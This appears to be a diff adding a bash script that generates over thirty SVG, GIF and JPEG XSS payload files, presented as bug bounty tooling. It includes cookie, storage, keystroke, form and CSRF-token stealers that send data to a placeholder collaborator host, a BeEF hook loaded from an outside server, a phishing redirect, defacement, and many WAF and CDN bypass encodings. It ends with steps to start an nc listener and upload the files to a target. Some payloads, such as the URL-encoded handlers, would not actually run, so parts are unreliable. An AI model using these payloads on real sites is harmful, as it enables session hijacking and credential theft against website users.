@@ -1,0 +1,455 @@
+#!/bin/bash
+# ============= COMPLETE IMAGE XSS PAYLOAD GENERATOR 2026 =============
+
+echo "🔥 Generating 20+ XSS Image Payloads for Bug Bounty..."
+
+# ============= LEVEL 1: BASIC DETECTION =============
+
+# 1. Basic Alert (Test if vulnerable)
+cat > 1-alert.svg << 'EOF'
+<svg onload="alert('XSS Found!')">
+    <rect width="100" height="100" fill="red"/>
+</svg>
+EOF
+
+# 2. Console Log (Stealth detection)
+cat > 2-console.svg << 'EOF'
+<svg onload="console.log('XSS Vulnerable')">
+    <circle cx="50" cy="50" r="40" fill="blue"/>
+</svg>
+EOF
+
+# 3. Image Error (Alternative detection)
+cat > 3-imgerror.svg << 'EOF'
+<svg xmlns="http://www.w3.org/2000/svg">
+    <image href="x" onerror="alert(1)"/>
+</svg>
+EOF
+
+# ============= LEVEL 2: COOKIE STEALING =============
+
+# 4. Cookie Stealer (Basic)
+cat > 4-cookie-steal.svg << 'EOF'
+<svg onload="fetch('https://YOUR-COLLABORATOR.com?c='+document.cookie)">
+    <rect width="100" height="100" fill="green"/>
+</svg>
+EOF
+
+# 5. Cookie Stealer (Image Beacon)
+cat > 5-cookie-img.svg << 'EOF'
+<svg onload="new Image().src='https://YOUR-COLLABORATOR.com?c='+document.cookie">
+    <rect width="100" height="100" fill="yellow"/>
+</svg>
+EOF
+
+# 6. All Cookies + LocalStorage
+cat > 6-all-data.svg << 'EOF'
+<svg onload="
+    fetch('https://YOUR-COLLABORATOR.com',{
+        method:'POST',
+        body:JSON.stringify({
+            cookies:document.cookie,
+            localStorage:localStorage,
+            sessionStorage:sessionStorage
+        })
+    })
+">
+    <rect width="100" height="100" fill="purple"/>
+</svg>
+EOF
+
+# ============= LEVEL 3: WAF BYPASS PAYLOADS =============
+
+# 7. Case Insensitive
+cat > 7-case-bypass.svg << 'EOF'
+<svg OnLoAd="alert(1)">
+    <rect width="100" height="100" fill="orange"/>
+</svg>
+EOF
+
+# 8. HTML Entity Encoding
+cat > 8-html-encode.svg << 'EOF'
+<svg onload="alert&#x28;1&#x29;">
+    <rect width="100" height="100" fill="pink"/>
+</svg>
+EOF
+
+# 9. URL Encoded
+cat > 9-url-encode.svg << 'EOF'
+<svg onload="%61%6c%65%72%74%28%31%29">
+    <rect width="100" height="100" fill="brown"/>
+</svg>
+EOF
+
+# 10. Line Break Bypass
+cat > 10-linebreak.svg << 'EOF'
+<svg onload="alert
+(1)">
+    <rect width="100" height="100" fill="cyan"/>
+</svg>
+EOF
+
+# 11. Double Quote Bypass
+cat > 11-quote-bypass.svg << 'EOF'
+<svg onload="alert`1`">
+    <rect width="100" height="100" fill="magenta"/>
+</svg>
+EOF
+
+# ============= LEVEL 4: PERSISTENT BACKDOORS =============
+
+# 12. Keylogger
+cat > 12-keylogger.svg << 'EOF'
+<svg onload="
+    let k='';
+    document.onkeypress=e=>{
+        k+=e.key;
+        if(k.length>10){
+            fetch('https://YOUR-COLLABORATOR.com?keys='+k);
+            k='';
+        }
+    }
+">
+    <rect width="100" height="100" fill="navy"/>
+</svg>
+EOF
+
+# 13. Form Hijacker
+cat > 13-form-hijack.svg << 'EOF'
+<svg onload="
+    document.querySelectorAll('form').forEach(f=>{
+        f.addEventListener('submit',e=>{
+            let d=new FormData(f);
+            fetch('https://YOUR-COLLABORATOR.com/form',{
+                method:'POST',
+                body:JSON.stringify([...d])
+            })
+        })
+    })
+">
+    <rect width="100" height="100" fill="teal"/>
+</svg>
+EOF
+
+# 14. Permanent Backdoor (BeEF Hook)
+cat > 14-beef-hook.svg << 'EOF'
+<svg onload="
+    var s=document.createElement('script');
+    s.src='https://YOUR-BEEF-SERVER:3000/hook.js';
+    document.body.appendChild(s)
+">
+    <rect width="100" height="100" fill="olive"/>
+</svg>
+EOF
+
+# 15. Crypto Miner (CPU Hijack)
+cat > 15-crypto-miner.svg << 'EOF'
+<svg onload="
+    setInterval(()=>{
+        for(let i=0;i<1000000;i++)Math.random()
+    },100)
+">
+    <rect width="100" height="100" fill="silver"/>
+</svg>
+EOF
+
+# ============= LEVEL 5: DOM MANIPULATION =============
+
+# 16. Page Defacement
+cat > 16-deface.svg << 'EOF'
+<svg onload="
+    document.body.innerHTML='<h1 style=color:red>HACKED</h1>'
+">
+    <rect width="100" height="100" fill="maroon"/>
+</svg>
+EOF
+
+# 17. Redirect to Phishing
+cat > 17-redirect.svg << 'EOF'
+<svg onload="
+    window.location='https://YOUR-PHISHING-PAGE.com'
+">
+    <rect width="100" height="100" fill="gold"/>
+</svg>
+EOF
+
+# 18. CSRF Token Stealer
+cat > 18-csrf-steal.svg << 'EOF'
+<svg onload="
+    let t=document.querySelector('meta[name=csrf-token]');
+    if(t) fetch('https://YOUR-COLLABORATOR.com?csrf='+t.content)
+">
+    <rect width="100" height="100" fill="indigo"/>
+</svg>
+EOF
+
+
+
+#!/bin/bash
+echo "🔥 Generating WAF/CDN Bypass XSS Payloads for 2026 Bug Bounty"
+
+# ============= LEVEL 1: ENCODING BYPASS =============
+
+# 1. Double URL Encoding
+cat > 1-double-encode.svg << 'EOF'
+<svg onload="%25%36%31%25%36%63%25%36%35%25%37%32%25%37%34(1)">
+    <rect width="100" height="100" fill="red"/>
+</svg>
+EOF
+
+# 2. Unicode Encoding
+cat > 2-unicode.svg << 'EOF'
+<svg onload="\u0061\u006c\u0065\u0072\u0074(1)">
+    <rect width="100" height="100" fill="blue"/>
+</svg>
+EOF
+
+# 3. Hex Encoding
+cat > 3-hex.svg << 'EOF'
+<svg onload="\x61\x6c\x65\x72\x74(1)">
+    <rect width="100" height="100" fill="green"/>
+</svg>
+EOF
+
+# 4. Octal Encoding
+cat > 4-octal.svg << 'EOF'
+<svg onload="\141\154\145\162\164(1)">
+    <rect width="100" height="100" fill="yellow"/>
+</svg>
+EOF
+
+# 5. Base64 Data URI
+cat > 5-base64.svg << 'EOF'
+<svg onload="eval(atob('YWxlcnQoMSk='))">
+    <rect width="100" height="100" fill="purple"/>
+</svg>
+EOF
+
+# ============= LEVEL 2: CASE & SPACE BYPASS =============
+
+# 6. Mixed Case
+cat > 6-mixed-case.svg << 'EOF'
+<SvG OnLoAd="aLerT(1)">
+    <rect width="100" height="100" fill="orange"/>
+</svg>
+EOF
+
+# 7. Tab/Newline Bypass
+cat > 7-newline.svg << 'EOF'
+<svg onload="alert
+(1)">
+    <rect width="100" height="100" fill="pink"/>
+</svg>
+EOF
+
+# 8. Carriage Return Bypass
+cat > 8-cr-bypass.svg << 'EOF'
+<svg onload="alert%0d(1)">
+    <rect width="100" height="100" fill="brown"/>
+</svg>
+EOF
+
+# 9. Null Byte Injection
+cat > 9-nullbyte.svg << 'EOF'
+<svg onload="alert%00(1)">
+    <rect width="100" height="100" fill="cyan"/>
+</svg>
+EOF
+
+# ============= LEVEL 3: TAG ATTRIBUTE BYPASS =============
+
+# 10. Event Handler Variations
+cat > 10-event-handlers.svg << 'EOF'
+<svg onload="alert(1)">               <!-- Standard -->
+<svg onload="alert(1)">               <!-- Space -->
+<svg/onload="alert(1)">               <!-- Self closing -->
+<svg onload=alert(1)>                 <!-- No quotes -->
+<svg onload=alert`1`>                 <!-- Backticks -->
+EOF
+
+# 11. SVG with <script> tag (No onload)
+cat > 11-script-tag.svg << 'EOF'
+<svg>
+    <script>alert(1)</script>
+    <rect width="100" height="100" fill="teal"/>
+</svg>
+EOF
+
+# 12. ForeignObject Payload
+cat > 12-foreignobject.svg << 'EOF'
+<svg>
+    <foreignObject>
+        <script>alert(1)</script>
+    </foreignObject>
+</svg>
+EOF
+
+# ============= LEVEL 4: CDN CACHE BYPASS =============
+
+# 13. Parameter Pollution
+cat > 13-param-pollution.svg << 'EOF'
+<svg onload="alert(1)" onload="alert(2)">
+    <rect width="100" height="100" fill="navy"/>
+</svg>
+EOF
+
+# 14. Random Parameter Addition
+cat > 14-random-param.svg << 'EOF'
+<svg onload="alert(1)" x="123456789">
+    <rect width="100" height="100" fill="indigo"/>
+</svg>
+EOF
+
+# 15. Comment Injection
+cat > 15-comment.svg << 'EOF'
+<svg><!--<onload="-->alert(1)"-->
+    <rect width="100" height="100" fill="violet"/>
+</svg>
+EOF
+
+# ============= LEVEL 5: ADVANCED WAF BYPASS =============
+
+# 16. JavaScript URI in href
+cat > 16-js-uri.svg << 'EOF'
+<svg>
+    <a xmlns="http://www.w3.org/2000/svg" href="javascript:alert(1)">
+        <rect width="100" height="100" fill="gold"/>
+    </a>
+</svg>
+EOF
+
+# 17. SVG + HTML Polyglot
+cat > 17-polyglot.svg << 'EOF'
+<?xml version="1.0"?>
+<!DOCTYPE svg [<!ENTITY xxe SYSTEM "data:text/html,<script>alert(1)</script>">]>
+<svg>&xxe;</svg>
+EOF
+
+# 18. Data URI SVG
+cat > 18-datauri.svg << 'EOF'
+data:image/svg+xml,<svg onload="alert(1)"/>
+EOF
+
+# 19. SVG with External Script
+cat > 19-external.svg << 'EOF'
+<svg>
+    <script href="https://YOUR-SERVER.com/xss.js"/>
+    <rect width="100" height="100" fill="salmon"/>
+</svg>
+EOF
+
+# 20. HTML5 + SVG Mix
+cat > 20-html-mix.svg << 'EOF'
+<svg xmlns="http://www.w3.org/2000/svg">
+    <style>
+        @import url('javascript:alert(1)');
+    </style>
+    <rect width="100" height="100" fill="coral"/>
+</svg>
+EOF
+
+# ============= LEVEL 6: CDN-SPECIFIC BYPASS =============
+
+# 21. Cloudflare Bypass
+cat > 21-cloudflare.svg << 'EOF'
+<svg onload="alert&#x28;1&#x29;">
+    <rect width="100" height="100" fill="chocolate"/>
+</svg>
+EOF
+
+# 22. AWS CloudFront Bypass
+cat > 22-cloudfront.svg << 'EOF'
+<svg onload="eval&#x28;String&#x2e;fromCharCode&#x28;97,108,101,114,116,40,49,41&#x29;&#x29;">
+    <rect width="100" height="100" fill="crimson"/>
+</svg>
+EOF
+
+# 23. Akamai Bypass
+cat > 23-akamai.svg << 'EOF'
+<svg onload="window['alert'](1)">
+    <rect width="100" height="100" fill="darkblue"/>
+</svg>
+EOF
+
+# ============= LEVEL 7: RUNTIME BYPASS =============
+
+# 24. setTimeout Bypass
+cat > 24-settimeout.svg << 'EOF'
+<svg onload="setTimeout('alert(1)',100)">
+    <rect width="100" height="100" fill="darkgreen"/>
+</svg>
+EOF
+
+# 25. setInterval Bypass
+cat > 25-setinterval.svg << 'EOF'
+<svg onload="setInterval('alert(1)',1000)">
+    <rect width="100" height="100" fill="darkkhaki"/>
+</svg>
+EOF
+
+# 26. eval Bypass
+cat > 26-eval.svg << 'EOF'
+<svg onload="eval('ale'+'rt(1)')">
+    <rect width="100" height="100" fill="darkmagenta"/>
+</svg>
+EOF
+
+# 27. Function Constructor Bypass
+cat > 27-function.svg << 'EOF'
+<svg onload="Function('alert(1)')()">
+    <rect width="100" height="100" fill="darkorange"/>
+</svg>
+EOF
+
+# ============= LEVEL 8: MOST EFFECTIVE (PROVEN) =============
+
+# 28. Minimal SVG (Smallest size)
+cat > 28-minimal.svg << 'EOF'
+<svg onload=alert(1)>
+EOF
+
+# 29. GIF Bypass (Works on many CDNs)
+cat > 29-gif-bypass.gif << 'EOF'
+GIF89a/*<svg/onload=alert(1)>*/=1;
+EOF
+
+# 30. JPEG Bypass (Exif XSS)
+cat > 30-jpeg-bypass.jpg << 'EOF'
+ÿØÿà<svg onload=alert(1)>
+EOF
+
+# ============= MEGA PAYLOAD (All Bypasses Combined) =============
+cat > 99-mega-bypass.svg << 'EOF'
+<svg xmlns="http://www.w3.org/2000/svg" 
+     xmlns:xlink="http://www.w3.org/1999/xlink"
+     onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
+    <rect width="100%" height="100%" fill="red"/>
+    <script>
+        // Fallback payload
+        window['\x61\x6c\x65\x72\x74'](1);
+    </script>
+    <foreignObject>
+        <div xmlns="http://www.w3.org/1999/xhtml">
+            <img src=x onerror="alert(1)">
+        </div>
+    </foreignObject>
+</svg>
+EOF
+
+echo ""
+echo "✅ Generated 30+ WAF/CDN Bypass Payloads"
+echo ""
+echo "📊 QUICK REFERENCE - MOST EFFECTIVE:"
+echo "┌─────────────────────────────────────────────────────────┐"
+echo "│ #1  Basic Test:           <svg onload=alert(1)>         │"
+echo "│ #2  Cloudflare Bypass:    alert&#x28;1&#x29;              │"
+echo "│ #3  AWS Bypass:           String.fromCharCode(97,108)   │"
+echo "│ #4  Minimal SVG:          <svg onload=alert(1)>         │"
+echo "│ #5  Mega Bypass:          99-mega-bypass.svg            │"
+echo "└─────────────────────────────────────────────────────────┘"
+echo ""
+echo "🎯 Test Method:"
+echo "1. Start listener: nc -lvp 4444"
+echo "2. Upload to target website"
+echo "3. Replace 'YOUR-COLLABORATOR.com' with your IP"
+echo "4. Check for alert or collaborator ping"
